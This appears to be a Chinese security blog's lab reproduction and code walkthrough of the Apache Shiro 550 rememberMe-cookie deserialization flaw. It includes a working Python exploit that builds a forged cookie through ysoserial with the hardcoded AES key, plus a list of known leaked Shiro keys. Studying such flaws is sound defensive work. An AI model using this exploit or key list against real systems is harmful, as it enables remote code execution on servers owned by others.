# 环境搭建

在这个链接下载shiro1.2.24的war包，提取码lorz

https://pan.baidu.com/s/1woR6xvnz2LGqOSykIh9G-A

在官网下载tomcat

https://tomcat.apache.org/download-80.cgi

![image-20220308195752353](images/1.png)

我是windows搭建的

然后把war解压到tomcat的webapps目录下

然后在tomcat的bin目录的cmd输入startup.bat，注意不要占用8080端口

![image-20220308195954128](images/2.png)

![image-20220308200016851](images/3.png)

搭建成功

但是为了后面的断点调试和另起端口方便抓包，我还是用的idea来起的tomcat

![image-20220314163710451](images/4.png)

如果配置不当可能会造成404，具体解决方法可以在网上搜一搜

# 漏洞介绍

Shiro 550 反序列化漏洞存在版本：shiro <1.2.4，产生原因是因为shiro接受了Cookie里面`rememberMe`的值，然后去进行Base64解密后，再使用AES密钥解密后的数据，进行反序列化

既然有反序列化，只要存在对应的Gadget就可以对其进行利用

```
简单介绍利用：

通过在cookie的rememberMe字段中插入恶意payload，
触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。
shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==
由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题
```

目前网上搜集到的密钥

```
kPH+bIxk5D2deZiIxcaaaA==
wGiHplamyXlVB11UXWol8g==
2AvVhdsgUs0FSA3SDFAdag==
4AvVhmFLUs0KTA3Kprsdag==
fCq+/xW488hMTCD+cmJ3aQ==
3AvVhmFLUs0KTA3Kprsdag==
1QWLxg+NYmxraMoxAXu/Iw==
ZUdsaGJuSmxibVI2ZHc9PQ==
Z3VucwAAAAAAAAAAAAAAAA==
U3ByaW5nQmxhZGUAAAAAAA==
6ZmI6I2j5Y+R5aSn5ZOlAA==
```

# 序列化过程

序列化的过程主要是通过加密将AbstractRememberMeManager.onSuccessfulLogin方面这里开始，然后是对cookie的一个生成过程，流程大概是当我们勾选上 Remember Me 选项框后，以 root 身份登录，后端会进行如下操作：

```
序列化用户身份"root"，得到值 A；
对 root 的序列化值 A 进行 AES 加密（密钥为硬编码的常量），得到值 B；
base64 编码上述计算的结果 B，得到值 C；
将值 C 设置到 response 响应包中 cookie 的 rememberme 字段。
```

这样在登陆后我们会有一个经过AES加密和base64编码的rememberMe的cookie，这也是后面我们反序列化会用到的一个重要点

# 反序列化过程

这里因为是反序列化的漏洞，所以主要分析反序列化的流程

断点打在`org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity`函数处，然后发送一个带有 rememberMe Cookie 的请求

![image-20220314181348644](images/5.png)

这里调用了CookieRememberMeManager的getRememberedPrincipals方法

![image-20220314181426187](images/6.png)

跟进一下

![image-20220314203120734](images/7.png)

继续跟进getRememberedSerializedIdentity

![image-20220314203204505](images/8.png)

在86行会获取Cookie，然后在95行对获取到的cookie进行base64解码，最后返回解码的值

回到getRememberedPrincipals方法中

![image-20220314203324979](images/9.png)

接着就是调用converBytesToPrincipals方法

```
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (this.getCipherService() != null) {
        bytes = this.decrypt(bytes);
    }

    return this.deserialize(bytes);
}
```

这里会调用decrypt方法进行AES解密

![image-20220314212745190](images/10.png)

这里主要是AES解密，用硬编码的密钥，流程就不看了，具体可以在这篇文章https://www.anquanke.com/post/id/225442#h3-6看到，有兴趣的时候可以去看看加密和解密的流程

还是回到convertBytesToPrincipals方法来

![image-20220314212948142](images/11.png)

对解密后的参数调用了deserialize方法

```
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
    return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);
}
```

继续跟进deserialize

![image-20220314213048438](images/12.png)

终于走到了readObject进行反序列化了

# 漏洞利用

伪造cookie的exp

```
import uuid
import base64
import subprocess
from Crypto.Cipher import AES


def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command],stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    # 这里密钥key是已知的，在shiro官网上有,可根据不同系统替换密钥
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme("dir")
    print("rememberMe={0}".format(payload.decode()))
```

在登陆后抓取任意的数据包，这样会存在一个rememberMe的cookie

![image-20220314184933538](images/13.png)

替换其中的rememberMe参数，并且删除掉JSESSIONID参数

![image-20220314202442861](images/14.png)

这里利用的是CC2的链子，但是在大多数时候却没有Commons-Collections4的依赖，虽然在shiro中有CC3.2版本的依赖，但是shiro中重写了`ObjectInputStream`类的`resolveClass`函数，`ObjectInputStream`的`resolveClass`方法用的是`Class.forName`类获取当前描述器所指代的类的Class对象。而重写后的`resolveClass`方法，采用的是`ClassUtils.forName`

```
public static Class forName(String fqcn) throws UnknownClassException {
    Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);
    if (clazz == null) {
        if (log.isTraceEnabled()) {
            log.trace("Unable to load class named [" + fqcn + "] from the thread context ClassLoader.  Trying the current ClassLoader...");
        }

        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);
    }

    if (clazz == null) {
        if (log.isTraceEnabled()) {
            log.trace("Unable to load class named [" + fqcn + "] from the current ClassLoader.  " + "Trying the system/application ClassLoader...");
        }

        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);
    }

    if (clazz == null) {
        String msg = "Unable to load class named [" + fqcn + "] from the thread context, current, or " + "system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.";
        throw new UnknownClassException(msg);
    } else {
        return clazz;
    }
}
```

如果传入了一个transform数组会报错

不过shiro中有Commons-Beanutils依赖，之前复现的时候也提到过可以找到一个原生的实现Comparator接口的原生类可以实现RCE

平常对shiro反序列化的利用多数还是利用的工具

# 后记

shiro的这个反序列化漏洞主要是因为在对rememberMe的Cookie进行base64解码和AES解密后会对其进行反序列化，而shiro的AES密钥是硬编码的，针对不同版本是可以爆破的，从而导致了可以传入一个进行了AES和base64编码的序列化数据流





参考链接

https://www.anquanke.com/post/id/225442#h2-11

https://blog.csdn.net/weixin_39190897/article/details/119046578

https://bwshen.blog.csdn.net/article/details/109269859
